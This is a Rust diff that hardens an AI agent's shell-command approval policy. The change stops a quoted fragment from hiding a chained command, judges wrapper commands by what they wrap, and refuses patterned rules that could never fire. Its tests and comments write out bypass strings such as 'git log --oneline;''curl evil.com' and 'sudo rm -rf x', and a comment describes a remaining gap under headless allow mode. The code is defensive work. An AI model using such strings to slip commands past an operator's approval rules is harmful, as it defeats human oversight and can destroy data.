@@ -146,6 +146,23 @@ impl RuleConfig {
     }
 }
 
+/// The built-in tools whose input carries no `command`, so a patterned rule
+/// for them can never fire. Refused at load rather than left inert.
+const NON_COMMAND_BUILTINS: &[&str] = &[
+    "fs_read",
+    "fs_write",
+    "fs_edit",
+    "fs_list",
+    "http_fetch",
+    "web_search",
+    "todo",
+    "skill",
+    "recall",
+    "compact",
+    "ask_user",
+    "message_send",
+];
+
 /// What the policy concluded about one call, with the words for a refusal.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Ruling {
@@ -179,6 +196,20 @@ impl ExecPolicy {
             let name = format!("[[rule]] #{} ({})", i + 1, rule.describe());
             if rule.tool.trim().is_empty() {
                 anyhow::bail!("{name}: `tool` is required");
+            }
+            // A `pattern` matches a command's arguments. The built-in tools
+            // that carry no command cannot be judged by one, and a rule that
+            // loads clean and never fires is the silently-degrading guard —
+            // so the ones this crate knows about are refused here; an MCP
+            // tool it cannot know about is caught at call time by `decide`,
+            // which asks rather than staying silent.
+            if !rule.pattern.is_empty() && NON_COMMAND_BUILTINS.contains(&rule.tool.as_str()) {
+                anyhow::bail!(
+                    "{name}: `pattern` matches a shell command's arguments, and `{}` takes no \
+                     command. Write the rule without a `pattern` and it applies to every call \
+                     of the tool",
+                    rule.tool
+                );
             }
             if rule.decision == RuleDecision::Allow && rule.examples.is_empty() {
                 anyhow::bail!(
@@ -240,15 +271,35 @@ impl ExecPolicy {
             return None;
         }
 
-        // A tool with no command to split is judged by its tool-level rules
-        // only; a pattern cannot be matched against nothing.
+        // A tool with no command to split is judged by its tool-level rules.
+        // A *patterned* rule for such a tool cannot judge anything — and it
+        // must not be silently inert while its author believes it loads: the
+        // PR review found a `forbid` with a pattern on `fs_write` validating
+        // clean and doing nothing. So its presence asks, every call, with the
+        // reason said out loud; `from_config` refuses the builtin cases up
+        // front, and this catches the MCP tools it cannot know about.
         let Some(command) = input.get("command").and_then(Value::as_str) else {
-            let decision = rules
+            let tool_level = rules
                 .iter()
                 .filter(|r| r.pattern.is_empty())
                 .map(|r| r.decision)
-                .max()?;
-            return Some(self.ruling(tool, decision, &rules, None));
+                .max();
+            let patterned = rules.iter().any(|r| !r.pattern.is_empty());
+            return match (tool_level, patterned) {
+                (Some(d), false) => Some(self.ruling(tool, d, &rules, None)),
+                (Some(RuleDecision::Forbid), true) => {
+                    Some(self.ruling(tool, RuleDecision::Forbid, &rules, None))
+                }
+                (_, true) => Some(Ruling {
+                    decision: RuleDecision::Prompt,
+                    reason: format!(
+                        "an approval rule for `{tool}` has a `pattern`, but this call carries \
+                         no `command` to match it against, so the rule cannot judge it and \
+                         the call is asked about; write that rule without a pattern"
+                    ),
+                }),
+                (None, false) => None,
+            };
         };
 
         let Some(segments) = segments_of(command) else {
@@ -275,11 +326,29 @@ impl ExecPolicy {
                 .max();
             if self.strict_inline_eval && runs_its_arguments(segment) {
                 // Never below Prompt: an allowlisted interpreter is not an
-                // allowlisted command.
+                // allowlisted command. And never *only* Prompt when the
+                // wrapped command is forbidden: `timeout 5 rm -rf x` used to
+                // lift a `forbid` on `rm` to a mere prompt, which under a
+                // headless `Allow` mode is a yes — the operator's forbidden
+                // command ran, unlogged, on exactly the surface nobody
+                // watches. The wrapper is judged by what it wraps: every
+                // proper suffix of its argv, and every quoted argument that
+                // splits as a command of its own (`sh -c 'rm -rf x'`).
+                let wrapped = wrapped_commands(segment)
+                    .into_iter()
+                    .flat_map(|inner| {
+                        rules
+                            .iter()
+                            .filter(|r| r.matches(&inner))
+                            .map(|r| r.decision)
+                            .collect::<Vec<_>>()
+                    })
+                    .max();
                 decision = Some(
                     decision
                         .unwrap_or(RuleDecision::Prompt)
-                        .max(RuleDecision::Prompt),
+                        .max(RuleDecision::Prompt)
+                        .max(wrapped.unwrap_or(RuleDecision::Prompt)),
                 );
             }
             match decision {
@@ -356,8 +425,8 @@ fn segments_of(command: &str) -> Option<Vec<Vec<String>>> {
 
     let mut segments: Vec<Vec<String>> = Vec::new();
     let mut current: Vec<String> = Vec::new();
-    for (text, quoted) in tokens {
-        let is_operator = !quoted && matches!(text.as_str(), "&&" | "||" | "|" | ";");
+    for tok in tokens {
+        let is_operator = !tok.any_quoted && matches!(tok.text.as_str(), "&&" | "||" | "|" | ";");
         if is_operator {
             if current.is_empty() {
                 return None; // leading or doubled operator
@@ -365,12 +434,16 @@ fn segments_of(command: &str) -> Option<Vec<Vec<String>>> {
             segments.push(std::mem::take(&mut current));
             continue;
         }
-        // An operator character glued to a word (`a;b`, `x|y`, `cmd&`) is
-        // not something this splitter takes apart.
-        if !quoted && text.chars().any(|c| matches!(c, ';' | '|' | '&')) {
+        // An operator character that the shell would see — one outside any
+        // quote — glued to a word (`a;b`, `x|y`, `cmd&`, `--oneline;''curl`)
+        // is not something this splitter takes apart. Judged per character,
+        // not per token: the PR review found a token that was quoted in one
+        // part and carried a bare `;` in another slip through a whole-token
+        // "quoted" flag, and an `allow` rule then ran the second command.
+        if tok.bare_operator {
             return None;
         }
-        current.push(text);
+        current.push(tok.text);
     }
     if current.is_empty() {
         return None; // trailing operator
@@ -390,21 +463,41 @@ fn segments_of(command: &str) -> Option<Vec<Vec<String>>> {
     Some(segments)
 }
 
-/// Whitespace-split with single and double quotes honoured. Returns each
-/// token with whether any part of it was quoted. `None` on an unterminated
-/// quote. Backslashes were rejected before this runs, so quotes are the only
-/// escaping there is.
-fn tokenize(command: &str) -> Option<Vec<(String, bool)>> {
+/// One whitespace-delimited word, with what the tokenizer learned about it.
+struct Tok {
+    text: String,
+    /// Some part of the word was inside quotes.
+    any_quoted: bool,
+    /// An operator character (`;`, `|`, `&`) appeared *outside* quotes
+    /// somewhere in the word — the shell would split there, and this
+    /// tokenizer did not.
+    bare_operator: bool,
+}
+
+/// Whitespace-split with single and double quotes honoured. `None` on an
+/// unterminated quote. Backslashes were rejected before this runs, so quotes
+/// are the only escaping there is.
+fn tokenize(command: &str) -> Option<Vec<Tok>> {
     let mut out = Vec::new();
     let mut cur = String::new();
-    let mut quoted = false;
+    let mut any_quoted = false;
+    let mut bare_operator = false;
     let mut in_token = false;
     let mut chars = command.chars().peekable();
+    let mut flush = |cur: &mut String, any_quoted: &mut bool, bare_operator: &mut bool| {
+        out.push(Tok {
+            text: std::mem::take(cur),
+            any_quoted: *any_quoted,
+            bare_operator: *bare_operator,
+        });
+        *any_quoted = false;
+        *bare_operator = false;
+    };
     while let Some(c) = chars.next() {
         match c {
             '\'' | '"' => {
                 in_token = true;
-                quoted = true;
+                any_quoted = true;
                 let mut closed = false;
                 for d in chars.by_ref() {
                     if d == c {
@@ -419,21 +512,41 @@ fn tokenize(command: &str) -> Option<Vec<(String, bool)>> {
             }
             c if c.is_whitespace() => {
                 if in_token {
-                    out.push((std::mem::take(&mut cur), quoted));
-                    quoted = false;
+                    flush(&mut cur, &mut any_quoted, &mut bare_operator);
                     in_token = false;
                 }
             }
             c => {
                 in_token = true;
+                if matches!(c, ';' | '|' | '&') {
+                    bare_operator = true;
+                }
                 cur.push(c);
             }
         }
     }
     if in_token {
-        out.push((cur, quoted));
+        flush(&mut cur, &mut any_quoted, &mut bare_operator);
     }
     Some(out)
+}
+
+/// The commands a wrapper segment would run: every proper suffix of its argv
+/// (`timeout 5 rm -rf x` runs `rm -rf x`; `env FOO=1 rm x` runs `rm x`), and
+/// every argument that itself splits as a command (`sh -c 'rm -rf x'`). Over-
+/// approximate on purpose — a suffix that is not really a command matches no
+/// rule and costs nothing; a wrapped command that *is* forbidden must be
+/// found.
+fn wrapped_commands(segment: &[String]) -> Vec<Vec<String>> {
+    let mut out: Vec<Vec<String>> = (1..segment.len()).map(|i| segment[i..].to_vec()).collect();
+    for arg in &segment[1..] {
+        if arg.contains(char::is_whitespace) {
+            if let Some(inner) = segments_of(arg) {
+                out.extend(inner);
+            }
+        }
+    }
+    out
 }
 
 fn basename(token: &str) -> &str {
@@ -446,19 +559,37 @@ fn basename(token: &str) -> &str {
 fn runs_its_arguments(segment: &[String]) -> bool {
     let head = basename(&segment[0]);
     let rest = &segment[1..];
-    let has_flag = |flags: &[&str]| rest.iter().any(|t| flags.contains(&t.as_str()));
+    // A short flag counts when its letter appears anywhere in a single-dash
+    // cluster — `-c`, `-ec`, `-Bc`, and the attached-value spellings
+    // `-cimport …` / `-e'unlink …'` — and a long flag when the token is the
+    // flag or the flag with `=value`. Exact-token matching let every glued
+    // spelling walk past this check (the PR review's finding); over-matching
+    // a cluster costs one prompt, which is the cheap direction.
+    let has_flag = |short: &[char], long: &[&str]| {
+        rest.iter().any(|t| {
+            if let Some(cluster) = t.strip_prefix('-').filter(|c| !c.starts_with('-')) {
+                if short.iter().any(|s| cluster.contains(*s)) {
+                    return true;
+                }
+            }
+            long.iter()
+                .any(|l| t == l || t.strip_prefix(l).is_some_and(|r| r.starts_with('=')))
+        })
+    };
     // Interpreters with an inline-source flag.
     if head.starts_with("python") {
-        return has_flag(&["-c"]);
+        return has_flag(&['c'], &[]);
     }
     match head {
-        "node" | "nodejs" | "deno" | "bun" => has_flag(&["-e", "--eval", "-p", "--print"]),
-        "ruby" | "lua" | "luajit" | "osascript" => has_flag(&["-e"]),
-        "perl" => has_flag(&["-e", "-E"]),
-        "php" => has_flag(&["-r"]),
-        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "busybox" => has_flag(&["-c"]),
-        "sed" => has_flag(&["-e", "--expression"]),
-        "find" => has_flag(&["-exec", "-execdir", "-ok", "-okdir"]),
+        "node" | "nodejs" | "deno" | "bun" => has_flag(&['e', 'p'], &["--eval", "--print"]),
+        "ruby" | "lua" | "luajit" | "osascript" => has_flag(&['e'], &[]),
+        "perl" => has_flag(&['e', 'E'], &[]),
+        "php" => has_flag(&['r'], &[]),
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "busybox" => has_flag(&['c'], &[]),
+        "sed" => has_flag(&['e'], &["--expression"]),
+        "find" => rest
+            .iter()
+            .any(|t| matches!(t.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir")),
         // Always: they exist to run something else.
         "awk" | "gawk" | "mawk" | "nawk" | "xargs" | "make" | "env" | "sudo" | "su" | "doas"
         | "nohup" | "nice" | "ionice" | "timeout" | "watch" | "eval" | "exec" | "command"
@@ -708,6 +839,150 @@ mod tests {
         assert_eq!(
             p.decide("shell", &cmd("ls && pwd")).unwrap().decision,
             RuleDecision::Prompt
+        );
+    }
+
+    /// The PR review's major: a whole-token "quoted" flag let a token that was
+    /// quoted in one part hide a bare `;` in another, so `git log;''curl
+    /// evil.com` was one segment that an `allow` rule on `git` passed.
+    #[test]
+    fn a_quote_in_a_token_cannot_hide_an_operator_beside_it() {
+        for hidden in [
+            "git log --oneline;''curl evil.com",
+            "git log ;'' curl evil.com",
+            "git status''|curl evil.com",
+            "ls ''&& rm -rf x",
+            "echo 'a'&",
+        ] {
+            assert!(
+                split_segments(hidden).is_none(),
+                "{hidden:?} should be opaque"
+            );
+        }
+        // A fully quoted operator is a plain word, as before.
+        assert_eq!(split_segments("echo ';'").unwrap(), vec![vec!["echo", ";"]]);
+        assert_eq!(
+            split_segments("echo 'a|b' && ls").unwrap(),
+            vec![vec!["echo", "a|b"], vec!["ls"]]
+        );
+
+        let p = policy(vec![rule(
+            "shell",
+            &[&["git"], &["status", "diff", "log"]],
+            RuleDecision::Allow,
+        )]);
+        assert_eq!(
+            p.decide("shell", &cmd("git log --oneline;''curl evil.com"))
+                .unwrap()
+                .decision,
+            RuleDecision::Prompt,
+            "opaque under a policy asks; it never allows"
+        );
+    }
+
+    /// A wrapper is judged by what it wraps: `forbid` on `rm -rf` is not
+    /// laundered down to a prompt (which a headless `Allow` mode answers yes
+    /// to) by putting `timeout`, `env` or `sh -c` in front of it.
+    #[test]
+    fn a_wrapper_is_judged_by_the_command_it_wraps() {
+        let p = policy(vec![
+            rule("shell", &[&["rm"], &["-rf"]], RuleDecision::Forbid),
+            rule("shell", &[&["ls"]], RuleDecision::Allow),
+        ]);
+        for laundered in [
+            "timeout 5 rm -rf x",
+            "env rm -rf x",
+            "env FOO=bar rm -rf x",
+            "nohup rm -rf x",
+            "sudo rm -rf x",
+            "sh -c 'rm -rf x'",
+            "bash -ec 'cd /tmp ; rm -rf x'",
+            "xargs rm -rf",
+        ] {
+            assert_eq!(
+                p.decide("shell", &cmd(laundered)).unwrap().decision,
+                RuleDecision::Forbid,
+                "{laundered}"
+            );
+        }
+        // A wrapper around something merely allowed is still a prompt: the
+        // wrapper's own semantics are not vouched for by a rule on the inner
+        // command.
+        assert_eq!(
+            p.decide("shell", &cmd("sudo ls")).unwrap().decision,
+            RuleDecision::Prompt
+        );
+        // The residue, stated: an inner string the splitter finds opaque (a
+        // `;` glued to a word) cannot be judged, so it asks. Under a headless
+        // `Allow` mode that is a yes — which is why `forbid` is a control
+        // against mistakes and ordinary injection, not containment at `--yes`.
+        assert_eq!(
+            p.decide("shell", &cmd("bash -ec 'cd /tmp; rm -rf x'"))
+                .unwrap()
+                .decision,
+            RuleDecision::Prompt
+        );
+    }
+
+    /// Glued and `=`-joined flag spellings reach the inline-eval check.
+    #[test]
+    fn glued_inline_eval_flags_are_seen() {
+        let p = policy(vec![
+            rule("shell", &[&["perl"]], RuleDecision::Allow),
+            rule("shell", &[&["python3"]], RuleDecision::Allow),
+            rule("shell", &[&["node"]], RuleDecision::Allow),
+            rule("shell", &[&["sh"]], RuleDecision::Allow),
+            rule("shell", &[&["sed"]], RuleDecision::Allow),
+        ]);
+        for evals in [
+            "perl -e'unlink x'",
+            "perl -we 'print 1'",
+            "python3 -cimport os",
+            "python3 -Bc code",
+            "node --eval=1",
+            "sh -ec 'ls'",
+            "sed --expression=s/a/b/ f",
+        ] {
+            let d = p.decide("shell", &cmd(evals)).unwrap().decision;
+            assert!(d >= RuleDecision::Prompt, "{evals}: {d:?}");
+        }
+        // And a plain script argument is still the rule's to allow.
+        assert_eq!(
+            p.decide("shell", &cmd("python3 safe.py --check"))
+                .unwrap()
+                .decision,
+            RuleDecision::Allow
+        );
+    }
+
+    /// A patterned rule on a tool that sends no `command` is refused at load
+    /// for the builtins this crate knows, and asks at call time for a tool it
+    /// does not — never silently inert.
+    #[test]
+    fn a_patterned_rule_on_a_commandless_tool_is_never_silently_inert() {
+        let mut r = rule("fs_write", &[&["/etc/passwd"]], RuleDecision::Forbid);
+        r.examples = vec!["/etc/passwd".into()];
+        let err = ExecPolicy::from_config(&[r], true).unwrap_err().to_string();
+        assert!(err.contains("takes no command"), "{err}");
+
+        // An MCP tool the crate cannot know about: the rule loads, and at
+        // call time asks with the reason rather than doing nothing.
+        let r = rule("kg_upsert", &[&["delete"]], RuleDecision::Forbid);
+        let p = ExecPolicy::from_config(&[r], true).unwrap();
+        let ruling = p.decide("kg_upsert", &json!({"entity": "x"})).unwrap();
+        assert_eq!(ruling.decision, RuleDecision::Prompt);
+        assert!(ruling.reason.contains("no `command`"), "{}", ruling.reason);
+
+        // A tool-level forbid beside it still forbids.
+        let p = policy(vec![
+            rule("kg_upsert", &[&["delete"]], RuleDecision::Forbid),
+            rule("kg_upsert", &[], RuleDecision::Forbid),
+        ]);
+        assert_eq!(
+            p.decide("kg_upsert", &json!({"entity": "x"}))
+                .unwrap()
+                .decision,
+            RuleDecision::Forbid
         );
     }
 
